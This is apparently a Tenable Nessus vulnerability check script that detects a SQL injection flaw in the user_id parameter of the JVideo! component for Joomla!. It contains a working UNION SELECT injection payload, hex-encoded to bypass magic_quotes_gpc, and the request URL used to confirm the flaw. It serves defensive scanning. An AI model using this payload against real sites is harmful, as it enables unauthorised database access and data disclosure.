#
# (C) Tenable Network Security, Inc.
#


if ( NASL_LEVEL < 3000 ) exit(0);


include("compat.inc");


if (description)
{
  script_id(38974);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(35146);
  script_xref(name:"milw0rm", value:"8821");

  script_name(english:"JVideo! Component for Joomla! user_id Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a SQL query");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is prone to a SQL\n",
      "injection attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running JVideo!, a third-party component for\n",
      "Joomla! used to create a video sharing community. \n",
      "\n",
      "The version of JVideo! installed on the remote host fails to sanitize\n",
      "user-supplied input to the 'user_id' parameter of the 'getUsername()'\n",
      "method in 'models/user.php' before using it to construct database\n",
      "queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an\n",
      "unauthenticated attacker may be able to exploit this issue to\n",
      "manipulate database queries, leading to disclosure of sensitive\n",
      "information or attacks against the underlying database."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://jvideo.infinovision.com/changelog"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Upgrade to JVideo! 0.5.2 or later."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to manipulate a "user" profile.
  exploit = string(rand() % 1000, " AND 1=2 UNION SELECT ", hexify(str:SCRIPT_NAME));

  url = string(
    dir, "/index.php?",
    "option=com_jvideo&",
    "view=user&",
    "user_id=", urlencode(str:exploit)
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # it looks like JVideo and...
    'div class="jvideo_' >< res[2] &&
    # we see our magic as a profile.
    string(SCRIPT_NAME, "'s Profile") >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to verify the vulnerability exists using the following\n",
        "URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
    exit(0);
  }
}
